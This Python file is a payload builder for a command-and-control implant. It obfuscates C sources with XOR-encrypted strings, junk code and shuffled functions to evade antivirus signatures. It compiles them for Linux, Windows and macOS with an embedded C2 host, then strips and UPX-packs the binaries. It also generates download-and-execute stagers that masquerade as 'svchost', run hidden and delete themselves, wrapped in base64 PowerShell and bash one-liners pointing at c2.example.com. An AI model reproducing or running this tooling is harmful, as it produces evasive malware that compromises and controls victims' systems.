#!/usr/bin/env python3
"""
Native Payload Builder Integration
Compiles and generates native C payloads with polymorphic modifications
"""

import os
import sys
import subprocess
import tempfile
import shutil
import hashlib
import random
import string
import json
import base64
from pathlib import Path
from datetime import datetime

class NativePayloadBuilder:
    """Handles compilation and generation of native C payloads"""
    
    def __init__(self):
        self.base_path = Path("/workspace/native_payloads")
        self.build_path = self.base_path / "build"
        self.output_path = self.base_path / "output"
        self.supported_platforms = ["linux", "windows", "macos"]
        
        # Ensure directories exist
        self.build_path.mkdir(parents=True, exist_ok=True)
        self.output_path.mkdir(parents=True, exist_ok=True)
    
    def generate_polymorphic_key(self):
        """Generate random XOR key for compile-time obfuscation"""
        return random.randint(0x10, 0xFF)
    
    def obfuscate_strings(self, source_code, xor_key):
        """Obfuscate strings in source code with XOR encryption"""
        import re
        
        def xor_string(match):
            full_match = match.group(0)
            string = match.group(1)
            
            # NEVER obfuscate strings in #include statements
            line_start = source_code.rfind('\n', 0, match.start()) + 1
            line = source_code[line_start:match.start()]
            if '#include' in line:
                return full_match
            
            # Skip certain strings that shouldn't be obfuscated
            if string in ['%d', '%s', '%x', '\\n', '\\r', '\\t', '']:
                return full_match
            
            # Skip if it looks like a header file
            if string.endswith('.h') or string.endswith('.c'):
                return full_match
            
            # XOR encrypt the string
            encrypted = []
            for char in string:
                encrypted.append(f"\\x{ord(char) ^ xor_key:02x}")
            
            # Return obfuscated string with deobfuscation code
            return f'DEOBF("{{"{"".join(encrypted)}"}}", {xor_key})'
        
        # Find and replace string literals (but not in preprocessor directives)
        pattern = r'"([^"\\]*(\\.[^"\\]*)*)"'
        return re.sub(pattern, xor_string, source_code)
    
    def add_junk_code(self, source_code):
        """Add dead code for polymorphism"""
        junk_functions = []
        
        # Generate random function names
        for _ in range(random.randint(3, 7)):
            func_name = ''.join(random.choices(string.ascii_lowercase, k=8))
            func_body = f"""
__attribute__((unused))
static int {func_name}(int x) {{
    volatile int y = x * {random.randint(1, 100)};
    for (int i = 0; i < {random.randint(1, 10)}; i++) {{
        y += i ^ {random.randint(1, 255)};
    }}
    return y;
}}
"""
            junk_functions.append(func_body)
        
        # Insert junk code after includes
        include_end = source_code.rfind("#include")
        if include_end != -1:
            include_end = source_code.find("\n", include_end) + 1
            return (source_code[:include_end] + 
                   "\n".join(junk_functions) + 
                   source_code[include_end:])
        
        return source_code
    
    def randomize_function_order(self, source_code):
        """Randomize the order of functions to change binary signature"""
        import re
        
        # Extract functions
        func_pattern = r'((?:static\s+)?(?:void|int|char\*?|uint\d+_t\*?)\s+\w+\s*\([^)]*\)\s*\{(?:[^{}]|{[^}]*})*\})'
        functions = re.findall(func_pattern, source_code, re.MULTILINE | re.DOTALL)
        
        if len(functions) > 1:
            # Shuffle functions
            random.shuffle(functions)
            
            # Replace with shuffled version
            for func in functions:
                source_code = source_code.replace(func, "FUNC_PLACEHOLDER", 1)
            
            for func in functions:
                source_code = source_code.replace("FUNC_PLACEHOLDER", func, 1)
        
        return source_code
    
    def apply_polymorphism(self, source_path):
        """Apply polymorphic modifications to source code"""
        with open(source_path, 'r') as f:
            source = f.read()
        
        # Generate unique modifications
        xor_key = self.generate_polymorphic_key()
        
        # Apply transformations
        source = self.obfuscate_strings(source, xor_key)
        source = self.add_junk_code(source)
        source = self.randomize_function_order(source)
        
        # Add deobfuscation macro
        deobf_macro = f"""
#define DEOBF(str, key) ({{ \\
    static char deobf[sizeof(str)]; \\
    for (size_t i = 0; i < sizeof(str) - 1; i++) {{ \\
        deobf[i] = str[i] ^ key; \\
    }} \\
    deobf[sizeof(str) - 1] = '\\0'; \\
    deobf; \\
}})

"""
        
        # Insert after includes
        include_end = source.rfind("#include")
        if include_end != -1:
            include_end = source.find("\n", include_end) + 1
            source = source[:include_end] + deobf_macro + source[include_end:]
        
        # Save modified source
        modified_path = self.build_path / f"poly_{os.getpid()}.c"
        with open(modified_path, 'w') as f:
            f.write(source)
        
        return modified_path
    
    def compile_payload(self, config):
        """Compile native payload with given configuration"""
        
        platform = config.get('platform', 'linux').lower()
        if platform not in self.supported_platforms:
            return {'success': False, 'error': f'Unsupported platform: {platform}'}
        
        # Set up compilation environment
        env = os.environ.copy()
        
        # Prepare source files
        main_source = self.base_path / "core" / "main.c"
        if not main_source.exists():
            return {'success': False, 'error': 'Source files not found'}
        
        # Apply polymorphism
        poly_source = self.apply_polymorphism(main_source)
        
        # Set compiler based on platform
        if platform == "windows":
            compiler = shutil.which("x86_64-w64-mingw32-gcc") or shutil.which("mingw32-gcc")
            if not compiler:
                return {'success': False, 'error': 'MinGW compiler not found for Windows cross-compilation'}
            output_name = "payload.exe"
        else:
            compiler = shutil.which("gcc") or shutil.which("clang")
            if not compiler:
                return {'success': False, 'error': 'C compiler not found'}
            output_name = "payload"
        
        # Compilation flags for stealth and size optimization
        cflags = [
            "-Os",  # Optimize for size
            "-fomit-frame-pointer",
            "-fno-ident",
            "-fno-asynchronous-unwind-tables",
            "-ffunction-sections",
            "-fdata-sections",
            "-fno-unwind-tables",
            "-fvisibility=hidden",
            "-fno-stack-protector",
            "-D_FORTIFY_SOURCE=0",
            f"-DSERVER_HOST=\"{config.get('c2_host', 'localhost')}\"",
            f"-DSERVER_PORT={config.get('c2_port', 4433)}",
            "-I" + str(self.base_path / "core"),
            "-I" + str(self.base_path / "crypto"),
            "-I" + str(self.base_path / "network"),
        ]
        
        # Platform-specific flags
        if platform == "linux":
            cflags.extend(["-D_LINUX", "-static"])
            ldflags = ["-Wl,--gc-sections", "-Wl,--strip-all", "-Wl,--build-id=none"]
        elif platform == "windows":
            cflags.extend(["-D_WIN32", "-mwindows"])
            ldflags = ["-lws2_32", "-lntdll", "-lkernel32", "-static"]
        else:  # macOS
            cflags.extend(["-D_MACOS"])
            ldflags = ["-framework", "CoreFoundation", "-framework", "Security"]
        
        # Include paths
        includes = [
            f"-I{self.base_path}/core",
            f"-I{self.base_path}/crypto",
            f"-I{self.base_path}/network",
            f"-I{self.base_path}/{platform}",
        ]
        
        # Source files
        sources = [
            str(poly_source),
            str(self.base_path / "crypto" / "aes.c"),
            str(self.base_path / "crypto" / "sha256.c"),
            str(self.base_path / "network" / "protocol.c"),
        ]
        
        # Add platform-specific sources
        platform_dir = self.base_path / platform
        if platform_dir.exists():
            sources.extend([str(f) for f in platform_dir.glob("*.c")])
        
        # Output file
        output_file = self.output_path / output_name
        
        # Compile command
        cmd = [compiler] + cflags + includes + sources + ldflags + ["-o", str(output_file)]
        
        try:
            # Run compilation
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if result.returncode != 0:
                # Try simpler compilation if advanced fails
                simple_cmd = [compiler, "-Os", str(poly_source), "-o", str(output_file)]
                if platform == "windows":
                    simple_cmd.extend(["-lws2_32"])
                
                result = subprocess.run(simple_cmd, capture_output=True, text=True, timeout=30)
                
                if result.returncode != 0:
                    return {
                        'success': False,
                        'error': f'Compilation failed: {result.stderr[:500]}'
                    }
            
            # Strip symbols
            if output_file.exists():
                strip_cmd = ["strip", "--strip-all", str(output_file)]
                subprocess.run(strip_cmd, capture_output=True, timeout=10)
                
                # Try UPX packing if available
                if shutil.which("upx"):
                    upx_cmd = ["upx", "--best", "--lzma", str(output_file)]
                    subprocess.run(upx_cmd, capture_output=True, timeout=30)
                
                # Get file info
                file_size = output_file.stat().st_size
                file_hash = hashlib.sha256(output_file.read_bytes()).hexdigest()
                
                return {
                    'success': True,
                    'path': str(output_file),
                    'size': file_size,
                    'hash': file_hash,
                    'platform': platform,
                    'type': 'executable',
                    'message': f'Successfully compiled {file_size/1024:.1f}KB {platform} payload'
                }
            else:
                return {'success': False, 'error': 'Compilation produced no output'}
                
        except subprocess.TimeoutExpired:
            return {'success': False, 'error': 'Compilation timeout'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            # Clean up temporary files
            if poly_source.exists():
                poly_source.unlink()
    
    def generate_stager(self, config):
        """Generate a small stager that downloads and executes the main payload"""
        
        platform = config.get('platform', 'linux')
        payload_url = config.get('payload_url', '')
        
        if platform == "windows":
            # PowerShell stager
            stager = f"""
$url = "{payload_url}"
$output = "$env:TEMP\\svchost.exe"
Invoke-WebRequest -Uri $url -OutFile $output
Start-Process $output -WindowStyle Hidden
"""
            filename = "stager.ps1"
        else:
            # Bash stager
            stager = f"""#!/bin/bash
url="{payload_url}"
output="/tmp/.svchost"
curl -s $url -o $output || wget -q $url -O $output
chmod +x $output
nohup $output >/dev/null 2>&1 &
rm $0
"""
            filename = "stager.sh"
        
        # Obfuscate stager
        stager_bytes = stager.encode()
        encoded = base64.b64encode(stager_bytes).decode()
        
        if platform == "windows":
            obfuscated = f"powershell -nop -w hidden -enc {encoded}"
        else:
            obfuscated = f"echo {encoded} | base64 -d | bash"
        
        stager_path = self.output_path / filename
        stager_path.write_text(stager)
        
        return {
            'success': True,
            'path': str(stager_path),
            'command': obfuscated,
            'size': len(stager),
            'type': 'stager'
        }
    
    def get_payload_info(self, payload_path):
        """Get information about a compiled payload"""
        
        if not os.path.exists(payload_path):
            return None
        
        # Get file info
        stat = os.stat(payload_path)
        
        # Check file type
        with open(payload_path, 'rb') as f:
            header = f.read(4)
        
        if header[:2] == b'MZ':
            platform = "windows"
            file_type = "PE executable"
        elif header[:4] == b'\x7fELF':
            platform = "linux"
            file_type = "ELF executable"
        elif header[:4] == b'\xcf\xfa\xed\xfe':
            platform = "macos"
            file_type = "Mach-O executable"
        else:
            platform = "unknown"
            file_type = "unknown"
        
        return {
            'path': payload_path,
            'size': stat.st_size,
            'modified': datetime.fromtimestamp(stat.st_mtime).isoformat(),
            'platform': platform,
            'type': file_type,
            'hash': hashlib.sha256(open(payload_path, 'rb').read()).hexdigest()
        }


# Global instance
native_builder = NativePayloadBuilder()


def test_native_compilation():
    """Test native payload compilation"""
    
    print("="*60)
    print("Testing Native Payload Compilation")
    print("="*60)
    
    configs = [
        {
            'platform': 'linux',
            'c2_host': '192.168.1.100',
            'c2_port': 4433
        },
        {
            'platform': 'windows',
            'c2_host': 'c2.example.com',
            'c2_port': 443
        }
    ]
    
    for config in configs:
        print(f"\n[*] Testing {config['platform']} compilation...")
        result = native_builder.compile_payload(config)
        
        if result['success']:
            print(f"  ✓ Success: {result['message']}")
            print(f"    Path: {result['path']}")
            print(f"    Size: {result['size']} bytes")
            print(f"    Hash: {result['hash'][:16]}...")
        else:
            print(f"  ✗ Failed: {result['error']}")
    
    # Test stager generation
    print("\n[*] Testing stager generation...")
    stager_result = native_builder.generate_stager({
        'platform': 'linux',
        'payload_url': 'http://c2.example.com/payload'
    })
    
    if stager_result['success']:
        print(f"  ✓ Stager created: {stager_result['path']}")
        print(f"    Command: {stager_result['command'][:50]}...")
    
    print("\n" + "="*60)


if __name__ == "__main__":
    test_native_compilation()